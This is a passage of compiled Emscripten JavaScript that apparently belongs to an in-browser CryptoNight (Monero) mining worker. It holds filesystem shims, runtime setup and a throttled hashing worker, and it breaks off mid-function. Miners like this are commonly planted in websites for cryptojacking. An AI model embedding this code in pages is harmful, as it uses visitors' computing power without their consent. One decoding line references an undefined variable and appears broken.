                        throw new FS.ErrnoError(ERRNO_CODES.EAGAIN)
                    }
                    if (result === null || result === undefined) break;
                    bytesRead++;
                    buffer[offset + i] = result
                }
                if (bytesRead) {
                    stream.node.timestamp = Date.now()
                }
                return bytesRead
            }),
            write: (function(stream, buffer, offset, length, pos) {
                for (var i = 0; i < length; i++) {
                    try {
                        output(buffer[offset + i])
                    } catch (e) {
                        throw new FS.ErrnoError(ERRNO_CODES.EIO)
                    }
                }
                if (length) {
                    stream.node.timestamp = Date.now()
                }
                return i
            })
        });
        return FS.mkdev(path, mode, dev)
    }),
    createLink: (function(parent, name, target, canRead, canWrite) {
        var path = PATH.join2(typeof parent === "string" ? parent : FS.getPath(parent), name);
        return FS.symlink(target, path)
    }),
    forceLoadFile: (function(obj) {
        if (obj.isDevice || obj.isFolder || obj.link || obj.contents) return !0;
        var success = !0;
        if (typeof XMLHttpRequest !== "undefined") {
            throw new Error("Lazy loading should have been performed (contents set) in createLazyFile, but it was not. Lazy loading only works in web workers. Use --embed-file or --preload-file in emcc on the main thread.")
        } else if (Module.read) {
            try {
                obj.contents = intArrayFromString(Module.read(obj.url), !0);
                obj.usedBytes = obj.contents.length
            } catch (e) {
                success = !1
            }
        } else {
            throw new Error("Cannot load without read() or XMLHttpRequest.")
        }
        if (!success) ___setErrNo(ERRNO_CODES.EIO);
        return success
    }),
    createLazyFile: (function(parent, name, url, canRead, canWrite) {
        function LazyUint8Array() {
            this.lengthKnown = !1;
            this.chunks = []
        }
        LazyUint8Array.prototype.get = function LazyUint8Array_get(idx) {
            if (idx > this.length - 1 || idx < 0) {
                return undefined
            }
            var chunkOffset = idx % this.chunkSize;
            var chunkNum = idx / this.chunkSize | 0;
            return this.getter(chunkNum)[chunkOffset]
        };
        LazyUint8Array.prototype.setDataGetter = function LazyUint8Array_setDataGetter(getter) {
            this.getter = getter
        };
        LazyUint8Array.prototype.cacheLength = function LazyUint8Array_cacheLength() {
            var xhr = new XMLHttpRequest;
            xhr.open("HEAD", url, !1);
            xhr.send(null);
            if (!(xhr.status >= 200 && xhr.status < 300 || xhr.status === 304)) throw new Error("Couldn\'t load " + url + ". Status: " + xhr.status);
            var datalength = Number(xhr.getResponseHeader("Content-length"));
            var header;
            var hasByteServing = (header = xhr.getResponseHeader("Accept-Ranges")) && header === "bytes";
            var usesGzip = (header = xhr.getResponseHeader("Content-Encoding")) && header === "gzip";
            var chunkSize = 1024 * 1024;
            if (!hasByteServing) chunkSize = datalength;
            var doXHR = (function(from, to) {
                if (from > to) throw new Error("invalid range (" + from + ", " + to + ") or no bytes requested!");
                if (to > datalength - 1) throw new Error("only " + datalength + " bytes available! programmer error!");
                var xhr = new XMLHttpRequest;
                xhr.open("GET", url, !1);
                if (datalength !== chunkSize) xhr.setRequestHeader("Range", "bytes=" + from + "-" + to);
                if (typeof Uint8Array != "undefined") xhr.responseType = "arraybuffer";
                if (xhr.overrideMimeType) {
                    xhr.overrideMimeType("text/plain; charset=x-user-defined")
                }
                xhr.send(null);
                if (!(xhr.status >= 200 && xhr.status < 300 || xhr.status === 304)) throw new Error("Couldn\'t load " + url + ". Status: " + xhr.status);
                if (xhr.response !== undefined) {
                    return new Uint8Array(xhr.response || [])
                } else {
                    return intArrayFromString(xhr.responseText || "", !0)
                }
            });
            var lazyArray = this;
            lazyArray.setDataGetter((function(chunkNum) {
                var start = chunkNum * chunkSize;
                var end = (chunkNum + 1) * chunkSize - 1;
                end = Math.min(end, datalength - 1);
                if (typeof lazyArray.chunks[chunkNum] === "undefined") {
                    lazyArray.chunks[chunkNum] = doXHR(start, end)
                }
                if (typeof lazyArray.chunks[chunkNum] === "undefined") throw new Error("doXHR failed!");
                return lazyArray.chunks[chunkNum]
            }));
            if (usesGzip || !datalength) {
                chunkSize = datalength = 1;
                datalength = this.getter(0).length;
                chunkSize = datalength;
                console.log("LazyFiles on gzip forces download of the whole file when length is accessed")
            }
            this._length = datalength;
            this._chunkSize = chunkSize;
            this.lengthKnown = !0
        };
        if (typeof XMLHttpRequest !== "undefined") {
            if (!ENVIRONMENT_IS_WORKER) throw "Cannot do synchronous binary XHRs outside webworkers in modern browsers. Use --embed-file or --preload-file in emcc";
            var lazyArray = new LazyUint8Array;
            Object.defineProperties(lazyArray, {
                length: {
                    get: (function() {
                        if (!this.lengthKnown) {
                            this.cacheLength()
                        }
                        return this._length
                    })
                },
                chunkSize: {
                    get: (function() {
                        if (!this.lengthKnown) {
                            this.cacheLength()
                        }
                        return this._chunkSize
                    })
                }
            });
            var properties = {
                isDevice: !1,
                contents: lazyArray
            }
        } else {
            var properties = {
                isDevice: !1,
                url: url
            }
        }
        var node = FS.createFile(parent, name, properties, canRead, canWrite);
        if (properties.contents) {
            node.contents = properties.contents
        } else if (properties.url) {
            node.contents = null;
            node.url = properties.url
        }
        Object.defineProperties(node, {
            usedBytes: {
                get: (function() {
                    return this.contents.length
                })
            }
        });
        var stream_ops = {};
        var keys = Object.keys(node.stream_ops);
        keys.forEach((function(key) {
            var fn = node.stream_ops[key];
            stream_ops[key] = function forceLoadLazyFile() {
                if (!FS.forceLoadFile(node)) {
                    throw new FS.ErrnoError(ERRNO_CODES.EIO)
                }
                return fn.apply(null, arguments)
            }
        }));
        stream_ops.read = function stream_ops_read(stream, buffer, offset, length, position) {
            if (!FS.forceLoadFile(node)) {
                throw new FS.ErrnoError(ERRNO_CODES.EIO)
            }
            var contents = stream.node.contents;
            if (position >= contents.length) return 0;
            var size = Math.min(contents.length - position, length);
            assert(size >= 0);
            if (contents.slice) {
                for (var i = 0; i < size; i++) {
                    buffer[offset + i] = contents[position + i]
                }
            } else {
                for (var i = 0; i < size; i++) {
                    buffer[offset + i] = contents.get(position + i)
                }
            }
            return size
        };
        node.stream_ops = stream_ops;
        return node
    }),
    createPreloadedFile: (function(parent, name, url, canRead, canWrite, onload, onerror, dontCreateFile, canOwn, preFinish) {
        Browser.init();
        var fullname = name ? PATH.resolve(PATH.join2(parent, name)) : parent;
        var dep = getUniqueRunDependency("cp " + fullname);

        function processData(byteArray) {
            function finish(byteArray) {
                if (preFinish) preFinish();
                if (!dontCreateFile) {
                    FS.createDataFile(parent, name, byteArray, canRead, canWrite, canOwn)
                }
                if (onload) onload();
                removeRunDependency(dep)
            }
            var handled = !1;
            Module.preloadPlugins.forEach((function(plugin) {
                if (handled) return;
                if (plugin["canHandle"](fullname)) {
                    plugin["handle"](byteArray, fullname, finish, (function() {
                        if (onerror) onerror();
                        removeRunDependency(dep)
                    }));
                    handled = !0
                }
            }));
            if (!handled) finish(byteArray)
        }
        addRunDependency(dep);
        if (typeof url == "string") {
            Browser.asyncLoad(url, (function(byteArray) {
                processData(byteArray)
            }), onerror)
        } else {
            processData(url)
        }
    }),
    indexedDB: (function() {
        return window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB
    }),
    DB_NAME: (function() {
        return "EM_FS_" + window.location.pathname
    }),
    DB_VERSION: 20,
    DB_STORE_NAME: "FILE_DATA",
    saveFilesToDB: (function(paths, onload, onerror) {
        onload = onload || (function() {});
        onerror = onerror || (function() {});
        var indexedDB = FS.indexedDB();
        try {
            var openRequest = indexedDB.open(FS.DB_NAME(), FS.DB_VERSION)
        } catch (e) {
            return onerror(e)
        }
        openRequest.onupgradeneeded = function openRequest_onupgradeneeded() {
            console.log("creating db");
            var db = openRequest.result;
            db.createObjectStore(FS.DB_STORE_NAME)
        };
        openRequest.onsuccess = function openRequest_onsuccess() {
            var db = openRequest.result;
            var transaction = db.transaction([FS.DB_STORE_NAME], "readwrite");
            var files = transaction.objectStore(FS.DB_STORE_NAME);
            var ok = 0,
                fail = 0,
                total = paths.length;

            function finish() {
                if (fail == 0) onload();
                else onerror()
            }
            paths.forEach((function(path) {
                var putRequest = files.put(FS.analyzePath(path).object.contents, path);
                putRequest.onsuccess = function putRequest_onsuccess() {
                    ok++;
                    if (ok + fail == total) finish()
                };
                putRequest.onerror = function putRequest_onerror() {
                    fail++;
                    if (ok + fail == total) finish()
                }
            }));
            transaction.onerror = onerror
        };
        openRequest.onerror = onerror
    }),
    loadFilesFromDB: (function(paths, onload, onerror) {
        onload = onload || (function() {});
        onerror = onerror || (function() {});
        var indexedDB = FS.indexedDB();
        try {
            var openRequest = indexedDB.open(FS.DB_NAME(), FS.DB_VERSION)
        } catch (e) {
            return onerror(e)
        }
        openRequest.onupgradeneeded = onerror;
        openRequest.onsuccess = function openRequest_onsuccess() {
            var db = openRequest.result;
            try {
                var transaction = db.transaction([FS.DB_STORE_NAME], "readonly")
            } catch (e) {
                onerror(e);
                return
            }
            var files = transaction.objectStore(FS.DB_STORE_NAME);
            var ok = 0,
                fail = 0,
                total = paths.length;

            function finish() {
                if (fail == 0) onload();
                else onerror()
            }
            paths.forEach((function(path) {
                var getRequest = files.get(path);
                getRequest.onsuccess = function getRequest_onsuccess() {
                    if (FS.analyzePath(path).exists) {
                        FS.unlink(path)
                    }
                    FS.createDataFile(PATH.dirname(path), PATH.basename(path), getRequest.result, !0, !0, !0);
                    ok++;
                    if (ok + fail == total) finish()
                };
                getRequest.onerror = function getRequest_onerror() {
                    fail++;
                    if (ok + fail == total) finish()
                }
            }));
            transaction.onerror = onerror
        };
        openRequest.onerror = onerror
    })
};
var SYSCALLS = {
    DEFAULT_POLLMASK: 5,
    mappings: {},
    umask: 511,
    calculateAt: (function(dirfd, path) {
        if (path[0] !== "/") {
            var dir;
            if (dirfd === -100) {
                dir = FS.cwd()
            } else {
                var dirstream = FS.getStream(dirfd);
                if (!dirstream) throw new FS.ErrnoError(ERRNO_CODES.EBADF);
                dir = dirstream.path
            }
            path = PATH.join2(dir, path)
        }
        return path
    }),
    doStat: (function(func, path, buf) {
        try {
            var stat = func(path)
        } catch (e) {
            if (e && e.node && PATH.normalize(path) !== PATH.normalize(FS.getPath(e.node))) {
                return -ERRNO_CODES.ENOTDIR
            }
            throw e
        }
        HEAP32[buf >> 2] = stat.dev;
        HEAP32[buf + 4 >> 2] = 0;
        HEAP32[buf + 8 >> 2] = stat.ino;
        HEAP32[buf + 12 >> 2] = stat.mode;
        HEAP32[buf + 16 >> 2] = stat.nlink;
        HEAP32[buf + 20 >> 2] = stat.uid;
        HEAP32[buf + 24 >> 2] = stat.gid;
        HEAP32[buf + 28 >> 2] = stat.rdev;
        HEAP32[buf + 32 >> 2] = 0;
        HEAP32[buf + 36 >> 2] = stat.size;
        HEAP32[buf + 40 >> 2] = 4096;
        HEAP32[buf + 44 >> 2] = stat.blocks;
        HEAP32[buf + 48 >> 2] = stat.atime.getTime() / 1e3 | 0;
        HEAP32[buf + 52 >> 2] = 0;
        HEAP32[buf + 56 >> 2] = stat.mtime.getTime() / 1e3 | 0;
        HEAP32[buf + 60 >> 2] = 0;
        HEAP32[buf + 64 >> 2] = stat.ctime.getTime() / 1e3 | 0;
        HEAP32[buf + 68 >> 2] = 0;
        HEAP32[buf + 72 >> 2] = stat.ino;
        return 0
    }),
    doMsync: (function(addr, stream, len, flags) {
        var buffer = new Uint8Array(HEAPU8.subarray(addr, addr + len));
        FS.msync(stream, buffer, 0, len, flags)
    }),
    doMkdir: (function(path, mode) {
        path = PATH.normalize(path);
        if (path[path.length - 1] === "/") path = path.substr(0, path.length - 1);
        FS.mkdir(path, mode, 0);
        return 0
    }),
    doMknod: (function(path, mode, dev) {
        switch (mode & 61440) {
            case 32768:
            case 8192:
            case 24576:
            case 4096:
            case 49152:
                break;
            default:
                return -ERRNO_CODES.EINVAL
        }
        FS.mknod(path, mode, dev);
        return 0
    }),
    doReadlink: (function(path, buf, bufsize) {
        if (bufsize <= 0) return -ERRNO_CODES.EINVAL;
        var ret = FS.readlink(path);
        var len = Math.min(bufsize, lengthBytesUTF8(ret));
        var endChar = HEAP8[buf + len];
        stringToUTF8(ret, buf, bufsize + 1);
        HEAP8[buf + len] = endChar;
        return len
    }),
    doAccess: (function(path, amode) {
        if (amode & ~7) {
            return -ERRNO_CODES.EINVAL
        }
        var node;
        var lookup = FS.lookupPath(path, {
            follow: !0
        });
        node = lookup.node;
        var perms = "";
        if (amode & 4) perms += "r";
        if (amode & 2) perms += "w";
        if (amode & 1) perms += "x";
        if (perms && FS.nodePermissions(node, perms)) {
            return -ERRNO_CODES.EACCES
        }
        return 0
    }),
    doDup: (function(path, flags, suggestFD) {
        var suggest = FS.getStream(suggestFD);
        if (suggest) FS.close(suggest);
        return FS.open(path, flags, 0, suggestFD, suggestFD).fd
    }),
    doReadv: (function(stream, iov, iovcnt, offset) {
        var ret = 0;
        for (var i = 0; i < iovcnt; i++) {
            var ptr = HEAP32[iov + i * 8 >> 2];
            var len = HEAP32[iov + (i * 8 + 4) >> 2];
            var curr = FS.read(stream, HEAP8, ptr, len, offset);
            if (curr < 0) return -1;
            ret += curr;
            if (curr < len) break
        }
        return ret
    }),
    doWritev: (function(stream, iov, iovcnt, offset) {
        var ret = 0;
        for (var i = 0; i < iovcnt; i++) {
            var ptr = HEAP32[iov + i * 8 >> 2];
            var len = HEAP32[iov + (i * 8 + 4) >> 2];
            var curr = FS.write(stream, HEAP8, ptr, len, offset);
            if (curr < 0) return -1;
            ret += curr
        }
        return ret
    }),
    varargs: 0,
    get: (function(varargs) {
        SYSCALLS.varargs += 4;
        var ret = HEAP32[SYSCALLS.varargs - 4 >> 2];
        return ret
    }),
    getStr: (function() {
        var ret = Pointer_stringify(SYSCALLS.get());
        return ret
    }),
    getStreamFromFD: (function() {
        var stream = FS.getStream(SYSCALLS.get());
        if (!stream) throw new FS.ErrnoError(ERRNO_CODES.EBADF);
        return stream
    }),
    getSocketFromFD: (function() {
        var socket = SOCKFS.getSocket(SYSCALLS.get());
        if (!socket) throw new FS.ErrnoError(ERRNO_CODES.EBADF);
        return socket
    }),
    getSocketAddress: (function(allowNull) {
        var addrp = SYSCALLS.get(),
            addrlen = SYSCALLS.get();
        if (allowNull && addrp === 0) return null;
        var info = __read_sockaddr(addrp, addrlen);
        if (info.errno) throw new FS.ErrnoError(info.errno);
        info.addr = DNS.lookup_addr(info.addr) || info.addr;
        return info
    }),
    get64: (function() {
        var low = SYSCALLS.get(),
            high = SYSCALLS.get();
        if (low >= 0) assert(high === 0);
        else assert(high === -1);
        return low
    }),
    getZero: (function() {
        assert(SYSCALLS.get() === 0)
    })
};

function ___syscall20(which, varargs) {
    SYSCALLS.varargs = varargs;
    try {
        return PROCINFO.pid
    } catch (e) {
        if (typeof FS === "undefined" || !(e instanceof FS.ErrnoError)) abort(e);
        return -e.errno
    }
}
var ___tm_current = STATICTOP;
STATICTOP += 48;
var ___tm_timezone = allocate(intArrayFromString("GMT"), "i8", ALLOC_STATIC);

function _gmtime_r(time, tmPtr) {
    var date = new Date(HEAP32[time >> 2] * 1e3);
    HEAP32[tmPtr >> 2] = date.getUTCSeconds();
    HEAP32[tmPtr + 4 >> 2] = date.getUTCMinutes();
    HEAP32[tmPtr + 8 >> 2] = date.getUTCHours();
    HEAP32[tmPtr + 12 >> 2] = date.getUTCDate();
    HEAP32[tmPtr + 16 >> 2] = date.getUTCMonth();
    HEAP32[tmPtr + 20 >> 2] = date.getUTCFullYear() - 1900;
    HEAP32[tmPtr + 24 >> 2] = date.getUTCDay();
    HEAP32[tmPtr + 36 >> 2] = 0;
    HEAP32[tmPtr + 32 >> 2] = 0;
    var start = Date.UTC(date.getUTCFullYear(), 0, 1, 0, 0, 0, 0);
    var yday = (date.getTime() - start) / (1e3 * 60 * 60 * 24) | 0;
    HEAP32[tmPtr + 28 >> 2] = yday;
    HEAP32[tmPtr + 40 >> 2] = ___tm_timezone;
    return tmPtr
}

function _gmtime(time) {
    return _gmtime_r(time, ___tm_current)
}

function ___lock() {}

function ___unlock() {}

function ___syscall6(which, varargs) {
    SYSCALLS.varargs = varargs;
    try {
        var stream = SYSCALLS.getStreamFromFD();
        FS.close(stream);
        return 0
    } catch (e) {
        if (typeof FS === "undefined" || !(e instanceof FS.ErrnoError)) abort(e);
        return -e.errno
    }
}

function _emscripten_memcpy_big(dest, src, num) {
    HEAPU8.set(HEAPU8.subarray(src, src + num), dest);
    return dest
}

function _ftime(p) {
    var millis = Date.now();
    HEAP32[p >> 2] = millis / 1e3 | 0;
    HEAP16[p + 4 >> 1] = millis % 1e3;
    HEAP16[p + 6 >> 1] = 0;
    HEAP16[p + 8 >> 1] = 0;
    return 0
}

function ___syscall140(which, varargs) {
    SYSCALLS.varargs = varargs;
    try {
        var stream = SYSCALLS.getStreamFromFD(),
            offset_high = SYSCALLS.get(),
            offset_low = SYSCALLS.get(),
            result = SYSCALLS.get(),
            whence = SYSCALLS.get();
        var offset = offset_low;
        FS.llseek(stream, offset, whence);
        HEAP32[result >> 2] = stream.position;
        if (stream.getdents && offset === 0 && whence === 0) stream.getdents = null;
        return 0
    } catch (e) {
        if (typeof FS === "undefined" || !(e instanceof FS.ErrnoError)) abort(e);
        return -e.errno
    }
}

function ___syscall146(which, varargs) {
    SYSCALLS.varargs = varargs;
    try {
        var stream = SYSCALLS.getStreamFromFD(),
            iov = SYSCALLS.get(),
            iovcnt = SYSCALLS.get();
        return SYSCALLS.doWritev(stream, iov, iovcnt)
    } catch (e) {
        if (typeof FS === "undefined" || !(e instanceof FS.ErrnoError)) abort(e);
        return -e.errno
    }
}

function ___syscall54(which, varargs) {
    SYSCALLS.varargs = varargs;
    try {
        var stream = SYSCALLS.getStreamFromFD(),
            op = SYSCALLS.get();
        switch (op) {
            case 21505:
                {
                    if (!stream.tty) return -ERRNO_CODES.ENOTTY;
                    return 0
                };
            case 21506:
                {
                    if (!stream.tty) return -ERRNO_CODES.ENOTTY;
                    return 0
                };
            case 21519:
                {
                    if (!stream.tty) return -ERRNO_CODES.ENOTTY;
                    var argp = SYSCALLS.get();HEAP32[argp >> 2] = 0;
                    return 0
                };
            case 21520:
                {
                    if (!stream.tty) return -ERRNO_CODES.ENOTTY;
                    return -ERRNO_CODES.EINVAL
                };
            case 21531:
                {
                    var argp = SYSCALLS.get();
                    return FS.ioctl(stream, op, argp)
                };
            case 21523:
                {
                    if (!stream.tty) return -ERRNO_CODES.ENOTTY;
                    return 0
                };
            default:
                abort("bad ioctl syscall " + op)
        }
    } catch (e) {
        if (typeof FS === "undefined" || !(e instanceof FS.ErrnoError)) abort(e);
        return -e.errno
    }
}
FS.staticInit();
__ATINIT__.unshift((function() {
    if (!Module.noFSInit && !FS.init.initialized) FS.init()
}));
__ATMAIN__.push((function() {
    FS.ignorePermissions = !1
}));
__ATEXIT__.push((function() {
    FS.quit()
}));
Module.FS_createFolder = FS.createFolder;
Module.FS_createPath = FS.createPath;
Module.FS_createDataFile = FS.createDataFile;
Module.FS_createPreloadedFile = FS.createPreloadedFile;
Module.FS_createLazyFile = FS.createLazyFile;
Module.FS_createLink = FS.createLink;
Module.FS_createDevice = FS.createDevice;
Module.FS_unlink = FS.unlink;
__ATINIT__.unshift((function() {
    TTY.init()
}));
__ATEXIT__.push((function() {
    TTY.shutdown()
}));
if (ENVIRONMENT_IS_NODE) {
    var fs = require("fs");
    var NODEJS_PATH = require("path");
    NODEFS.staticInit()
}
DYNAMICTOP_PTR = allocate(1, "i32", ALLOC_STATIC);
STACK_BASE = STACKTOP = Runtime.alignMemory(STATICTOP);
STACK_MAX = STACK_BASE + TOTAL_STACK;
DYNAMIC_BASE = Runtime.alignMemory(STACK_MAX);
HEAP32[DYNAMICTOP_PTR >> 2] = DYNAMIC_BASE;
staticSealed = !0;
Module.wasmTableSize = 14;
Module.wasmMaxTableSize = 14;

function invoke_ii(index, a1) {
    try {
        return Module.dynCall_ii(index, a1)
    } catch (e) {
        if (typeof e !== "number" && e !== "longjmp") throw e;
        Module.setThrew(1, 0)
    }
}

function invoke_iiii(index, a1, a2, a3) {
    try {
        return Module.dynCall_iiii(index, a1, a2, a3)
    } catch (e) {
        if (typeof e !== "number" && e !== "longjmp") throw e;
        Module.setThrew(1, 0)
    }
}

function invoke_viii(index, a1, a2, a3) {
    try {
        Module.dynCall_viii(index, a1, a2, a3)
    } catch (e) {
        if (typeof e !== "number" && e !== "longjmp") throw e;
        Module.setThrew(1, 0)
    }
}
Module.asmGlobalArg = {
    "Math": Math,
    "Int8Array": Int8Array,
    "Int16Array": Int16Array,
    "Int32Array": Int32Array,
    "Uint8Array": Uint8Array,
    "Uint16Array": Uint16Array,
    "Uint32Array": Uint32Array,
    "Float32Array": Float32Array,
    "Float64Array": Float64Array,
    "NaN": NaN,
    "Infinity": Infinity
};
Module.asmLibraryArg = {
    "abort": abort,
    "assert": assert,
    "enlargeMemory": enlargeMemory,
    "getTotalMemory": getTotalMemory,
    "abortOnCannotGrowMemory": abortOnCannotGrowMemory,
    "invoke_ii": invoke_ii,
    "invoke_iiii": invoke_iiii,
    "invoke_viii": invoke_viii,
    "_gmtime_r": _gmtime_r,
    "_gmtime": _gmtime,
    "___lock": ___lock,
    "___syscall6": ___syscall6,
    "___setErrNo": ___setErrNo,
    "___unlock": ___unlock,
    "_ftime": _ftime,
    "_emscripten_memcpy_big": _emscripten_memcpy_big,
    "___syscall54": ___syscall54,
    "___syscall140": ___syscall140,
    "___syscall20": ___syscall20,
    "___assert_fail": ___assert_fail,
    "___syscall146": ___syscall146,
    "DYNAMICTOP_PTR": DYNAMICTOP_PTR,
    "tempDoublePtr": tempDoublePtr,
    "ABORT": ABORT,
    "STACKTOP": STACKTOP,
    "STACK_MAX": STACK_MAX
};
var asm = Module.asm(Module.asmGlobalArg, Module.asmLibraryArg, buffer);
Module.asm = asm;
var _cryptonight_hash = Module._cryptonight_hash = (function() {
    return Module.asm._cryptonight_hash.apply(null, arguments)
});
var getTempRet0 = Module.getTempRet0 = (function() {
    return Module.asm.getTempRet0.apply(null, arguments)
});
var _free = Module._free = (function() {
    return Module.asm._free.apply(null, arguments)
});
var runPostSets = Module.runPostSets = (function() {
    return Module.asm.runPostSets.apply(null, arguments)
});
var setTempRet0 = Module.setTempRet0 = (function() {
    return Module.asm.setTempRet0.apply(null, arguments)
});
var establishStackSpace = Module.establishStackSpace = (function() {
    return Module.asm.establishStackSpace.apply(null, arguments)
});
var _memmove = Module._memmove = (function() {
    return Module.asm._memmove.apply(null, arguments)
});
var stackSave = Module.stackSave = (function() {
    return Module.asm.stackSave.apply(null, arguments)
});
var _memset = Module._memset = (function() {
    return Module.asm._memset.apply(null, arguments)
});
var _malloc = Module._malloc = (function() {
    return Module.asm._malloc.apply(null, arguments)
});
var _cryptonight_create = Module._cryptonight_create = (function() {
    return Module.asm._cryptonight_create.apply(null, arguments)
});
var _memcpy = Module._memcpy = (function() {
    return Module.asm._memcpy.apply(null, arguments)
});
var _emscripten_get_global_libc = Module._emscripten_get_global_libc = (function() {
    return Module.asm._emscripten_get_global_libc.apply(null, arguments)
});
var stackAlloc = Module.stackAlloc = (function() {
    return Module.asm.stackAlloc.apply(null, arguments)
});
var setThrew = Module.setThrew = (function() {
    return Module.asm.setThrew.apply(null, arguments)
});
var _sbrk = Module._sbrk = (function() {
    return Module.asm._sbrk.apply(null, arguments)
});
var _fflush = Module._fflush = (function() {
    return Module.asm._fflush.apply(null, arguments)
});
var stackRestore = Module.stackRestore = (function() {
    return Module.asm.stackRestore.apply(null, arguments)
});
var _cryptonight_destroy = Module._cryptonight_destroy = (function() {
    return Module.asm._cryptonight_destroy.apply(null, arguments)
});
var ___errno_location = Module.___errno_location = (function() {
    return Module.asm.___errno_location.apply(null, arguments)
});
var dynCall_ii = Module.dynCall_ii = (function() {
    return Module.asm.dynCall_ii.apply(null, arguments)
});
var dynCall_iiii = Module.dynCall_iiii = (function() {
    return Module.asm.dynCall_iiii.apply(null, arguments)
});
var dynCall_viii = Module.dynCall_viii = (function() {
    return Module.asm.dynCall_viii.apply(null, arguments)
});
Runtime.stackAlloc = Module.stackAlloc;
Runtime.stackSave = Module.stackSave;
Runtime.stackRestore = Module.stackRestore;
Runtime.establishStackSpace = Module.establishStackSpace;
Runtime.setTempRet0 = Module.setTempRet0;
Runtime.getTempRet0 = Module.getTempRet0;
Module.asm = asm;
if (memoryInitializer) {
    if (typeof Module.locateFile === "function") {
        memoryInitializer = Module.locateFile(memoryInitializer)
    } else if (Module.memoryInitializerPrefixURL) {
        memoryInitializer = Module.memoryInitializerPrefixURL + memoryInitializer
    }
    if (ENVIRONMENT_IS_NODE || ENVIRONMENT_IS_SHELL) {
        var data = Module.readBinary(memoryInitializer);
        HEAPU8.set(data, Runtime.GLOBAL_BASE)
    } else {
        addRunDependency("memory initializer");
        var applyMemoryInitializer = (function(data) {
            var barf = Uint8Array.from(atob(raw), c => c.charCodeAt(0))
            HEAPU8.set(barf, Runtime.GLOBAL_BASE);
            if (Module.memoryInitializerRequest) delete Module.memoryInitializerRequest.response;
            removeRunDependency("memory initializer")
        });

        function doBrowserLoad() {
            setTimeout(function() {
                applyMemoryInitializer()
            }, 20)
        }
        if (Module.memoryInitializerRequest) {
            function useRequest() {
                var request = Module.memoryInitializerRequest;
                if (request.status !== 200 && request.status !== 0) {
                    console.warn("a problem seems to have happened with Module.memoryInitializerRequest, status: " + request.status + ", retrying " + memoryInitializer);
                    doBrowserLoad();
                    return
                }
                applyMemoryInitializer(request.response)
            }
            if (Module.memoryInitializerRequest.response) {
                setTimeout(useRequest, 0)
            } else {
                Module.memoryInitializerRequest.addEventListener("load", useRequest)
            }
        } else {
            doBrowserLoad()
        }
    }
}

function ExitStatus(status) {
    this.name = "ExitStatus";
    this.message = "Program terminated with exit(" + status + ")";
    this.status = status
}
ExitStatus.prototype = new Error;
ExitStatus.prototype.constructor = ExitStatus;
var initialStackTop;
var preloadStartTime = null;
var calledMain = !1;
dependenciesFulfilled = function runCaller() {
    if (!Module.calledRun) run();
    if (!Module.calledRun) dependenciesFulfilled = runCaller
};
Module.callMain = Module.callMain = function callMain(args) {
    args = args || [];
    ensureInitRuntime();
    var argc = args.length + 1;

    function pad() {
        for (var i = 0; i < 4 - 1; i++) {
            argv.push(0)
        }
    }
    var argv = [allocate(intArrayFromString(Module.thisProgram), "i8", ALLOC_NORMAL)];
    pad();
    for (var i = 0; i < argc - 1; i = i + 1) {
        argv.push(allocate(intArrayFromString(args[i]), "i8", ALLOC_NORMAL));
        pad()
    }
    argv.push(0);
    argv = allocate(argv, "i32", ALLOC_NORMAL);
    try {
        var ret = Module._main(argc, argv, 0);
        exit(ret, !0)
    } catch (e) {
        if (e instanceof ExitStatus) {
            return
        } else if (e == "SimulateInfiniteLoop") {
            Module.noExitRuntime = !0;
            return
        } else {
            var toLog = e;
            if (e && typeof e === "object" && e.stack) {
                toLog = [e, e.stack]
            }
            Module.printErr("exception thrown: " + toLog);
            Module.quit(1, e)
        }
    } finally {
        calledMain = !0
    }
};

function run(args) {
    args = args || Module["arguments"];
    if (preloadStartTime === null) preloadStartTime = Date.now();
    if (runDependencies > 0) {
        return
    }
    preRun();
    if (runDependencies > 0) return;
    if (Module.calledRun) return;

    function doRun() {
        if (Module.calledRun) return;
        Module.calledRun = !0;
        if (ABORT) return;
        ensureInitRuntime();
        preMain();
        if (Module.onRuntimeInitialized) Module.onRuntimeInitialized();
        if (Module._main && shouldRunNow) Module.callMain(args);
        postRun()
    }
    if (Module.setStatus) {
        Module.setStatus("Running...");
        setTimeout((function() {
            setTimeout((function() {
                Module.setStatus("")
            }), 1);
            doRun()
        }), 1)
    } else {
        doRun()
    }
}
Module.run = Module.run = run;

function exit(status, implicit) {
    if (implicit && Module.noExitRuntime) {
        return
    }
    if (Module.noExitRuntime) {} else {
        ABORT = !0;
        EXITSTATUS = status;
        STACKTOP = initialStackTop;
        exitRuntime();
        if (Module.onExit) Module.onExit(status)
    }
    if (ENVIRONMENT_IS_NODE) {
        process.exit(status)
    }
    Module.quit(status, new ExitStatus(status))
}
Module.exit = Module.exit = exit;
var abortDecorators = [];

function abort(what) {
    if (Module.onAbort) {
        Module.onAbort(what)
    }
    if (what !== undefined) {
        Module.print(what);
        Module.printErr(what);
        what = JSON.stringify(what)
    } else {
        what = ""
    }
    ABORT = !0;
    EXITSTATUS = 1;
    var extra = "\\nIf this abort() is unexpected, build with -s ASSERTIONS=1 which can give more information.";
    var output = "abort(" + what + ") at " + stackTrace() + extra;
    if (abortDecorators) {
        abortDecorators.forEach((function(decorator) {
            output = decorator(output, what)
        }))
    }
    throw output
}
Module.abort = Module.abort = abort;
if (Module.preInit) {
    if (typeof Module.preInit == "function") Module.preInit = [Module.preInit];
    while (Module.preInit.length > 0) {
        Module.preInit.pop()()
    }
}
var shouldRunNow = !0;
if (Module.noInitialRun) {
    shouldRunNow = !1
}
run();
var CWW = (function() {
    this.ctx = _cryptonight_create();
    this.throttleWait = 0;
    this.throttledStart = 0;
    this.throttledHashes = 0;
    this.workThrottledBound = this.workThrottled.bind(this);
    this.currentJob = null;
    this.target = new Uint8Array([255, 255, 255, 255, 255, 255, 255, 255]);
    var heap = Module.HEAPU8.buffer;
    this.input = new Uint8Array(heap, Module._malloc(84), 84);
    this.output = new Uint8Array(heap, Module._malloc(32), 32);
    self.postMessage("ready");
    self.onmessage = this.onMessage.bind(this)
});
CWW.prototype.onMessage = (function(msg) {
    var job = msg.data;
    if (job.verify_id) {
        this.verify(job);
        return
    }
    if (!this.currentJob || this.currentJob.job_id !== job.job_id) {
        this.setJob(job)
    }
    if (job.throttle) {
        this.throttleWait = 1 / (1 - job.throttle) - 1;
        this.throttledStart = this.now();
        this.throttledHashes = 0;
        this.workThrottled()
    } else {
        this.work()
    }
});
CWW.prototype.destroy = (function() {
    _cryptonight_destroy(this.ctx)
});
CWW.prototype.hexToBytes = (function(hex, bytes) {
    var bytes = new Uint8Array(hex.length / 2);
    for (var i = 0, c = 0; c < hex.length; c += 2, i++) {
        bytes[i] = parseInt(hex.substr(c, 2), 16)
    }
